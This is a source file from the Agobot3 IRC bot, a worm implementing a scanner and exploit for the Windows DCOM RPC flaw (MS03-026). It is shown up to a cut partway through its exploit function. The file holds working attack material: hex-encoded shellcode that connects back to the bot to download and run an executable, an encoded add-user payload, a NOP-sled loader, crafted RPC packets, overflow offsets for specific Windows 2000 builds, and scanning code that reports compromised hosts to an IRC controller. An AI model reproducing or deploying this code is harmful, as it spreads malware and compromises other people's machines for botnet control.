/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "dcom2scanner.h"
#include "mainctrl.h"
#include "utility.h"
#include "shellcode.h"

#define DCOM2_SHELLCODE_OFFSET_IP	0x16D	// Offset for the IP to connect to
#define DCOM2_SHELLCODE_OFFSET_PORT	0x171	// Offset for the port to connect to

char dcom2_shellcode[]=
	"\x64\x63\x6F\x6D\x68\x78\x30\x72\xE9\x5F\x01\x00\x00\x5B\x56"
	"\x57\x50\xE8\xB3\x03\x00\x00\x8D\xB3\x9F\x00\x00\x00\x8D\xBB\xA8"
	"\x00\x00\x00\xC7\x83\xA7\x01\x00\x00\x0F\x00\x00\x00\xE8\x07\x03"
	"\x00\x00\x89\x83\xF4\x00\x00\x00\x8D\xBB\xB7\x00\x00\x00\xC7\x83"
	"\xA7\x01\x00\x00\x0D\x00\x00\x00\xE8\xEC\x02\x00\x00\x89\x83\xF0"
	"\x00\x00\x00\x8D\xBB\xC4\x00\x00\x00\xE8\xC3\x02\x00\x00\x89\x83"
	"\xE4\x00\x00\x00\x8D\xBB\xCA\x00\x00\x00\xE8\xB2\x02\x00\x00\x89"
	"\x83\xE8\x00\x00\x00\x8D\xBB\xD5\x00\x00\x00\xE8\xA1\x02\x00\x00"
	"\x89\x83\xEC\x00\x00\x00\x8D\xB3\x0A\x00\x00\x00\x8D\xBB\x11\x00"
	"\x00\x00\xE8\x8A\x02\x00\x00\x89\x83\x41\x00\x00\x00\x8D\xBB\x1C"
	"\x00\x00\x00\xE8\x79\x02\x00\x00\x89\x83\x45\x00\x00\x00\x8D\xBB"
	"\x23\x00\x00\x00\xE8\x68\x02\x00\x00\x89\x83\x49\x00\x00\x00\x8D"
	"\xBB\x2B\x00\x00\x00\xE8\x57\x02\x00\x00\x89\x83\x4D\x00\x00\x00"
	"\x8D\xBB\x30\x00\x00\x00\xE8\x46\x02\x00\x00\x89\x83\x51\x00\x00"
	"\x00\x8D\xBB\x35\x00\x00\x00\xE8\x35\x02\x00\x00\x89\x83\x55\x00"
	"\x00\x00\x8D\xB3\x59\x00\x00\x00\x8D\xBB\x60\x00\x00\x00\xE8\x1E"
	"\x02\x00\x00\x89\x83\x87\x00\x00\x00\x8D\xBB\x66\x00\x00\x00\xE8"
	"\x0D\x02\x00\x00\x89\x83\x8B\x00\x00\x00\x8D\xBB\x6D\x00\x00\x00"
	"\xE8\xFC\x01\x00\x00\x89\x83\x8F\x00\x00\x00\x8D\xBB\x74\x00\x00"
	"\x00\xE8\xEB\x01\x00\x00\x89\x83\x93\x00\x00\x00\x8D\xBB\x7B\x00"
	"\x00\x00\xE8\xDA\x01\x00\x00\x89\x83\x97\x00\x00\x00\x8D\xBB\x82"
	"\x00\x00\x00\xE8\xC9\x01\x00\x00\x89\x83\x9B\x00\x00\x00\x53\xE8"
	"\xEB\x02\x00\x00\x5B\x58\x5F\x5E\xE8\x10\x05\x00\x00\xE8\x9C\xFE"
	"\xFF\xFF\x00\x00\x00\x00\x11\x11\x11\x11\x22\x22\x77\x73\x32\x5F"
	"\x33\x32\x00\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x00\x73\x6F"
	"\x63\x6B\x65\x74\x00\x63\x6F\x6E\x6E\x65\x63\x74\x00\x72\x65\x63"
	"\x76\x00\x73\x65\x6E\x64\x00\x63\x6C\x6F\x73\x65\x73\x6F\x63\x6B"
	"\x65\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6D\x73\x76\x63\x72"
	"\x74\x00\x66\x6F\x70\x65\x6E\x00\x66\x63\x6C\x6F\x73\x65\x00\x66"
	"\x77\x72\x69\x74\x65\x00\x6D\x65\x6D\x73\x65\x74\x00\x6D\x61\x6C"
	"\x6C\x6F\x63\x00\x66\x72\x65\x65\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x6B\x65\x72\x6E\x65\x6C\x33\x32\x00\x47\x65\x74\x50\x72\x6F"
	"\x63\x41\x64\x64\x72\x65\x73\x73\x00\x4C\x6F\x61\x64\x4C\x69\x62"
	"\x72\x61\x72\x79\x41\x00\x53\x6C\x65\x65\x70\x00\x45\x78\x69\x74"
	"\x54\x68\x72\x65\x61\x64\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6F"
	"\x63\x65\x73\x73\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x77\x2B\x62\x00\x00\x00\x00\x00\x77\x69"
	"\x6E\x68\x6C\x70\x70\x33\x32\x2E\x65\x78\x65\x00\x6F\x70\x65\x6E"
	"\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x51\x57\x56\x56\xFF\x93\xF0\x00\x00\x00\x50\x59\x57\x51\xFF"
	"\x93\xF4\x00\x00\x00\x5E\x5F\x59\xC3\x31\xC0\x89\x83\xA3\x01\x00"
	"\x00\x8B\x93\xA3\x01\x00\x00\x3B\x93\x93\x01\x00\x00\x7D\x63\x42"
	"\x89\x93\xA3\x01\x00\x00\x31\xC0\x8B\x83\xA3\x01\x00\x00\xC1\xE0"
	"\x02\x8B\x8B\x9B\x01\x00\x00\x01\xC1\x8B\x01\x03\x83\x8F\x01\x00"
	"\x00\x57\x56\x51\x89\xFE\x89\xC7\x8B\x8B\xA7\x01\x00\x00\xF3\xA6"
	"\x59\x5E\x5F\x75\xBC\x31\xC0\x8B\x83\xA3\x01\x00\x00\xD1\xE0\x8B"
	"\x8B\x9F\x01\x00\x00\x01\xC1\x31\xC0\x66\x8B\x01\xC1\xE0\x02\x8B"
	"\x8B\x97\x01\x00\x00\x01\xC8\x8B\x08\x03\x8B\x8F\x01\x00\x00\x89"
	"\xC8\xC3\x31\xC0\xC3\xE9\xC8\x02\x00\x00\x3E\x8B\x40\x34\x3E\x8B"
	"\xA8\xB8\x00\x00\x00\xE9\x0E\x00\x00\x00\x50\x51\x56\x55\x64\xA1"
	"\x30\x00\x00\x00\x85\xC0\x78\xE2\x3E\x8B\x40\x0C\x3E\x8B\x70\x1C"
	"\xAD\x3E\x8B\x68\x08\x89\xAB\x8F\x01\x00\x00\x89\xE8\x66\x81\x38"
	"\x4D\x5A\x75\xC1\x05\x3C\x00\x00\x00\x8B\x08\x03\x8B\x8F\x01\x00"
	"\x00\x66\x81\x39\x50\x45\x75\xAD\x81\xC1\x78\x00\x00\x00\x8B\x31"
	"\x03\xB3\x8F\x01\x00\x00\x81\xC6\x18\x00\x00\x00\xAD\x89\x83\x93"
	"\x01\x00\x00\xAD\x03\x83\x8F\x01\x00\x00\x89\x83\x97\x01\x00\x00"
	"\xAD\x03\x83\x8F\x01\x00\x00\x89\x83\x9B\x01\x00\x00\xAD\x03\x83"
	"\x8F\x01\x00\x00\x89\x83\x9F\x01\x00\x00\x5D\x5E\x59\x58\xC3\x50"
	"\xB8\x00\x04\x00\x00\xE8\x71\x01\x00\x00\x3D\x00\x00\x00\x00\x0F"
	"\x84\xEA\xFF\xFF\xFF\x89\x83\x83\x01\x00\x00\x58\x8B\x93\x83\x01"
	"\x00\x00\x52\x68\x01\x01\x00\x00\x3E\xFF\x53\x41\x3D\x00\x00\x00"
	"\x00\x0F\x85\xE5\xFF\xFF\xFF\x68\x06\x00\x00\x00\x68\x01\x00\x00"
	"\x00\x68\x02\x00\x00\x00\x3E\xFF\x53\x45\x3D\xFF\xFF\xFF\xFF\x0F"
	"\x84\xE2\xFF\xFF\xFF\x89\x83\xF8\x00\x00\x00\x57\x50\x53\x8D\x93"
	"\x7F\x01\x00\x00\xC6\x02\x16\x52\x8D\x93\xFC\x00\x00\x00\x66\xC7"
	"\x02\x02\x00\x66\x8B\x7B\x08\x66\x89\x7A\x02\x8B\x7B\x04\x89\x7A"
	"\x04\x52\x8B\x83\xF8\x00\x00\x00\x50\x3E\xFF\x53\x49\x3D\x00\x00"
	"\x00\x00\x0F\x8C\xC6\xFF\xFF\xFF\x5B\x58\x5F\x50\xB8\x00\x10\x00"
	"\x00\xE8\xD5\x00\x00\x00\x3D\x00\x00\x00\x00\x0F\x84\xEA\xFF\xFF"
	"\xFF\x89\x83\x60\x01\x00\x00\x58\xE8\x39\x00\x00\x00\xE8\xD8\x00"
	"\x00\x00\xE8\x57\x00\x00\x00\xE8\x1F\x01\x00\x00\xC3\x8B\x83\xF8"
	"\x00\x00\x00\x50\x3E\xFF\x53\x55\x8B\x83\xAB\x01\x00\x00\x40\x89"
	"\x83\xAB\x01\x00\x00\x3D\x05\x00\x00\x00\x0F\x84\x05\x00\x00\x00"
	"\xE9\x42\xFF\xFF\xFF\xC3\x68\x00\x00\x00\x00\x68\x04\x00\x00\x00"
	"\x8D\x93\x87\x01\x00\x00\x52\x8B\x93\xF8\x00\x00\x00\x52\x3E\xFF"
	"\x53\x4D\x3D\x01\x00\x00\x00\x0F\x8C\xB0\xFF\xFF\xFF\xC3\x57\x56"
	"\x8B\xBB\x87\x01\x00\x00\x8B\xB3\x8B\x01\x00\x00\x39\xF7\x5E\x5F"
	"\x0F\x84\x32\x00\x00\x00\x68\x00\x00\x00\x00\x68\x00\x10\x00\x00"
	"\x8B\x93\x60\x01\x00\x00\x52\x8B\x93\xF8\x00\x00\x00\x52\x3E\xFF"
	"\x53\x4D\x3D\x01\x00\x00\x00\x0F\x8C\x70\xFF\xFF\xFF\x01\x83\x8B"
	"\x01\x00\x00\xE9\x50\x00\x00\x00\xE8\x6E\x00\x00\x00\x50\x8B\x83"
	"\xF8\x00\x00\x00\x50\x3E\xFF\x53\x55\x58\xC3\x89\xC7\x50\x3E\xFF"
	"\x93\x97\x00\x00\x00\x5F\x50\x57\x68\x00\x00\x00\x00\x50\x3E\xFF"
	"\x93\x93\x00\x00\x00\x5F\x5F\x5F\x58\xC3\x8D\x93\x64\x01\x00\x00"
	"\x52\x8D\x93\x6C\x01\x00\x00\x52\x3E\xFF\x93\x87\x00\x00\x00\x5F"
	"\x5F\x89\x83\x68\x01\x00\x00\xC3\xFF\xB3\x68\x01\x00\x00\x50\x68"
	"\x01\x00\x00\x00\x8B\x93\x60\x01\x00\x00\x52\x3E\xFF\x93\x8F\x00"
	"\x00\x00\x5F\x5F\x5F\x5F\xE9\x43\xFF\xFF\xFF\x8B\x93\x68\x01\x00"
	"\x00\x52\x3E\xFF\x93\x8B\x00\x00\x00\x5F\xC3\x50\x8D\x83\x0C\x01"
	"\x00\x00\x50\x8D\x83\x1C\x01\x00\x00\x50\x68\x00\x00\x00\x00\x68"
	"\x00\x00\x00\x00\x68\x28\x00\x00\x00\x68\x00\x00\x00\x00\x68\x00"
	"\x00\x00\x00\x68\x00\x00\x00\x00\x8D\x83\x6C\x01\x00\x00\x50\x68"
	"\x00\x00\x00\x00\x3E\xFF\x93\xEC\x00\x00\x00\x58\xC3\xE8\xA9\xFF"
	"\xFF\xFF\x68\x00\x00\x00\x00\xFF\x93\xE8\x00\x00\x00\x90";

char dcom2_shellcode_adduser[]=
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x3E\x01\x80\x34\x0A\x99\xE2\xFA"
	"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x31\x99\x99\x99\xC3\x21\x95\x69"
	"\x64\xE6\x12\x99\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5"
	"\x9A\x6A\x12\xEF\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA"
	"\x74\xCF\xCE\xC8\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED"
	"\x91\xC0\xC6\x1A\x5E\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF"
	"\xBD\x9A\x5A\x48\x78\x9A\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A"
	"\x5A\x58\x78\x9B\x9A\x58\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F"
	"\x97\x12\x49\xF3\x9A\xC0\x71\xBD\x99\x99\x99\xF1\x66\x66\x66\x99"
	"\xF1\x99\x89\x99\x99\xF3\x9D\x66\xCE\x6D\x22\x81\x69\x64\xE6\x10"
	"\x9A\x1A\x5F\x95\xAA\x59\xC9\xCF\x66\xCE\x61\xC9\x66\xCE\x65\xAA"
	"\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B"
	"\x77\xAA\x59\x5A\x71\xCA\x66\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA"
	"\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xD1\xFC\xF8\xE9\xDA\xEB\xFC\xF8"
	"\xED\xFC\x99\xCE\xF0\xF7\xDC\xE1\xFC\xFA\x99\xDC\xE1\xF0\xED\xC9"
	"\xEB\xF6\xFA\xFC\xEA\xEA\x99\xFA\xF4\xFD\xB9\xB6\xFA\xB9\xF7\xFC"
	"\xED\xB9\xEC\xEA\xFC\xEB\xB9\xFC\xB9\xF8\xEA\xFD\xBA\xAA\xAB\xA8"
	"\xB9\xB6\xF8\xFD\xFD\xB9\xBF\xBF\xB9\xF7\xFC\xED\xB9\xF5\xF6\xFA"
	"\xF8\xF5\xFE\xEB\xF6\xEC\xE9\xB9\xF8\xFD\xF4\xF0\xF7\xF0\xEA\xED"
	"\xEB\xF8\xED\xF6\xEB\xEA\xB9\xFC\xB9\xB6\xF8\xFD\xFD\x99";

char dcom2_loader[]=
	"\xE8\x00\x00\x00\x00\x58\x66\x31\xC0\x40\x81\x38\x64\x63\x6F"
	"\x6D\x75\xF7\x81\x78\x04\x68\x78\x30\x72\x75\xEE\x05\x08\x00\x00"
	"\x00\xFF\xE0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90";

char dcom2_bindstr[]=
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x7F\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00"
	"\xa0\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00";

char dcom2_request1[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\xE8\x03\x00\x00\xE5\x00\x00\x00"
	"\xD0\x03\x00\x00\x01\x00\x04\x00\x05\x00\x06\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x32\x24\x58\xFD\xCC\x45\x64\x49\xB0\x70\xDD\xAE"
	"\x74\x2C\x96\xD2\x60\x5E\x0D\x00\x01\x00\x00\x00\x00\x00\x00\x00"
	"\x70\x5E\x0D\x00\x02\x00\x00\x00\x7C\x5E\x0D\x00\x00\x00\x00\x00"
	"\x10\x00\x00\x00\x80\x96\xF1\xF1\x2A\x4D\xCE\x11\xA6\x6A\x00\x20"
	"\xAF\x6E\x72\xF4\x0C\x00\x00\x00\x4D\x41\x52\x42\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x0D\xF0\xAD\xBA\x00\x00\x00\x00\xA8\xF4\x0B\x00"
	"\x60\x03\x00\x00\x60\x03\x00\x00\x4D\x45\x4F\x57\x04\x00\x00\x00"
	"\xA2\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x38\x03\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x30\x03\x00\x00\x28\x03\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\xC8\x00\x00\x00\x4D\x45\x4F\x57"
	"\x28\x03\x00\x00\xD8\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
	"\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\xC4\x28\xCD\x00\x64\x29\xCD\x00\x00\x00\x00\x00"
	"\x07\x00\x00\x00\xB9\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAB\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA5\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA6\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA4\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAD\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAA\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\x07\x00\x00\x00\x60\x00\x00\x00\x58\x00\x00\x00"
	"\x90\x00\x00\x00\x40\x00\x00\x00\x20\x00\x00\x00\x78\x00\x00\x00"
	"\x30\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x50\x00\x00\x00\x4F\xB6\x88\x20\xFF\xFF\xFF\xFF\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x48\x00\x00\x00\x07\x00\x66\x00\x06\x09\x02\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x10\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x78\x19\x0C\x00"
	"\x58\x00\x00\x00\x05\x00\x06\x00\x01\x00\x00\x00\x70\xD8\x98\x93"
	"\x98\x4F\xD2\x11\xA9\x3D\xBE\x57\xB2\x00\x00\x00\x32\x00\x31\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x80\x00\x00\x00\x0D\xF0\xAD\xBA"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x18\x43\x14\x00\x00\x00\x00\x00\x60\x00\x00\x00\x60\x00\x00\x00"
	"\x4D\x45\x4F\x57\x04\x00\x00\x00\xC0\x01\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x3B\x03\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x00\x00\x00"
	"\x01\x00\x01\x00\x81\xC5\x17\x03\x80\x0E\xE9\x4A\x99\x99\xF1\x8A"
	"\x50\x6F\x7A\x85\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x30\x00\x00\x00\x78\x00\x6E\x00"
	"\x00\x00\x00\x00\xD8\xDA\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x20\x2F\x0C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
	"\x00\x00\x00\x00\x03\x00\x00\x00\x46\x00\x58\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x10\x00\x00\x00\x30\x00\x2E\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x68\x00\x00\x00\x0E\x00\xFF\xFF"
	"\x68\x8B\x0B\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char dcom2_request2[]=
	"\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x5C\x00\x5C\x00";

// filename
char dcom2_request3[]=
	"\x5C\x00\x43\x00\x24\x00\x5C\x00\x31\x00\x32\x00\x33\x00\x34\x00"
	"\x35\x00\x36\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x2E\x00\x64\x00\x6F\x00\x63\x00\x00\x00";

char dcom2_request4[]=
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x20\x00\x00\x00\x30\x00\x2D\x00"
	"\x00\x00\x00\x00\x88\x2A\x0C\x00\x02\x00\x00\x00\x01\x00\x00\x00"
	"\x28\x8C\x0C\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";

char dcom2_shellcode_buf[]=
	"\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00\x2e\x00"
	"\x30\x00\x2e\x00\x31\x00\x5c\x00\x49\x00\x50\x00"
	"\x43\x00\x24\x00\x5c\x00"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"\xe9\xf3\xfd\xff\xff"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE";

#define DCOM2_SCBUF_OFFSET_SC		0x24	// Offset for shellcode in the buffer
#define DCOM2_SCBUF_BUF_MAX			0x208	// Maximimum number of bytes in shellcode
#define DCOM2_SCBUF_OFFSET_JMP_ADDR	DCOM2_SCBUF_BUF_MAX+DCOM2_SCBUF_OFFSET_SC+0x8
											// Offset for the jump address
#define DCOM2_SCBUF_OFFSET_TOP_SEH	DCOM2_SCBUF_OFFSET_JMP_ADDR+0x4
											// Offset for the top of the structured
											// exception handler

typedef struct dcom2_offset_s
{	unsigned long lTopSEH;
	unsigned long lJmpAddr;
} dcom2_offset;

dcom2_offset dcom2_my_offsets[]=
{
	// Win2K English SP4 + MS03-026
	{	0x7c54144c,		// kernel32.dll v5.0.2195.6688
		0x77a1b496	},	// OLEAUT32.dll v2.40.4522.0
	// Win2K English SP3 + HotFixes + MS03-026
	{	0x77eda1f0,		// kernel32.dll v5.0.2195.6079
		0x77a1afa9	},	// OLEAUT32.dll v2.40.4518.0
	{	0x41414141,		// test
		0x77FCC662	}	// test
};

/*
		DCOM2 Scanner starts here
		scans for dcom exploit
*/

CScannerDCOM2::CScannerDCOM2() { m_sScannerName.Assign("dcom2"); }
void CScannerDCOM2::StartScan(const CString &sHost)
{	bool bSuccess=false;
	if(ScanPort(sHost.CStr(), 135))
	{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning ip %s:135.", m_sScannerName.CStr(), sHost.CStr());
		bSuccess=Exploit(sHost); }

#ifdef WIN32
	if(ScanPort(sHost.CStr(), 445) && !bSuccess)
	{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning ip %s:445.", m_sScannerName.CStr(), sHost.CStr());
		bSuccess=ExploitNP(sHost); }
#endif

	// Success
	if(bSuccess) g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"%s: exploited ip %s.", m_sScannerName.CStr(), sHost.CStr()); }

bool CScannerDCOM2::ExploitNP(const CString &sHost)
{	return false; }

bool CScannerDCOM2::Exploit(const CString &sHost)
{	char szRecvBuf[4096], szSCBuf[4096], szLoadBuf[4096], szReqBuf[4096], szShellBuf[4096], szLoaderBuf[4096];
	int iShellSize=0, iLoaderSize=0, iPos=0, iSCSize=0, iLoadSize=0, iReqSize=0;
	char *pTemp;
//	int iHostOS=FpHost(sHost.CStr(), FP_RPC);
//	if(iHostOS==OS_UNKNOWN || iHostOS==OS_WINNT) return false;

	// Get a funky fresh socket
	int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sSocket==SOCKET_ERROR) return false;

	// Fill in sockaddr and resolve the host
	sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family=AF_INET; ssin.sin_port=htons(135);
	ssin.sin_addr.s_addr=ResolveAddress(sHost.CStr());
	if(ssin.sin_addr.s_addr==INADDR_NONE) // The host couldn't be resolved, exit
	{	xClose(sSocket); return false; }

/*	if(IsPrivate(g_cMainCtrl.m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(sHost.CStr()))
		iShellSize=setup_shellcode(dcom2_shellcode, sizeof(dcom2_shellcode), szShellBuf, sizeof(szShellBuf), \
			g_cMainCtrl.m_cBot.bot_ftrans_port.iValue, inet_addr(g_cMainCtrl.m_cIRC.m_sLocalHost.CStr()), \
			DCOM2_SHELLCODE_OFFSET_PORT, DCOM2_SHELLCODE_OFFSET_IP, NULL);
	else
		iShellSize=setup_shellcode(dcom2_shellcode, sizeof(dcom2_shellcode), szShellBuf, sizeof(szShellBuf), \
			g_cMainCtrl.m_cBot.bot_ftrans_port.iValue, g_cMainCtrl.m_cIRC.m_lLocalAddr, \
			DCOM2_SHELLCODE_OFFSET_PORT, DCOM2_SHELLCODE_OFFSET_IP, NULL);*/

